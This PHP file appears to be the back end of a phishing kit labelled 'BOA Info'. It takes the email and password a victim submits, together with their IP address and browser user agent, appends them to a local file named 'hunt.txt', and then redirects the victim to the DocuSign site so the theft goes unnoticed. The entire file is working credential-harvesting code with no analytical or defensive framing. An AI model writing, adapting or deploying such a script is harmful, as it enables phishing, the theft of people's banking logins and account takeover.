<?php
error_reporting(0);
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------BOA Info-----------------------\n";
$message .= "Email           : ".$_POST['email']."\n";
$message .= "Password           : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$fp = fopen("hunt.txt","a");
fputs($fp,$message);
fclose($fp);
  header ("Location: https://www.docusign.com/");


?>